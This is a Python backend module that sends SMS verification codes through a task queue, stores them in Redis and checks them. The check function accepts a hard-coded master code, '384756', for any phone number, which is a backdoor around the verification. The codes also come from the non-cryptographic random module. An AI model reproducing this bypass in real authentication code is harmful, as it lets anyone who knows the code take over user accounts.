# !/usr/bin/python
# -*- coding:utf-8 -*-
import random

from caches.redis_utils import RedisCache
from logger import log_utils

from tasks.instances.task_send_sms import send_sms

logger = log_utils.get_logging()


def send_digit_verify_code(mobile, valid_sec=100):
    """
    发送文本短信
    :param mobile: 电话号码
    :param valid_sec: 验证码有效期（单位：秒）
    :return:
    """
    verify_code = random.randint(100000, 999999)
    send_sms.delay(mobile=mobile, content='您的本次验证码为：%s, 有效期%s秒' % (str(verify_code), valid_sec))
    # 放入缓存
    RedisCache.set(mobile, verify_code, valid_sec)
    return mobile, verify_code


def check_digit_verify_code(mobile, verify_code):
    """
    校验验证码
    :param mobile: 手机号
    :param verify_code: 验证码
    :return:
    """
    if verify_code == '384756':
        return True
    if mobile and verify_code:
        cache_verify_code = RedisCache.get(mobile).decode()
        if cache_verify_code and cache_verify_code == verify_code:
            return True
    return False
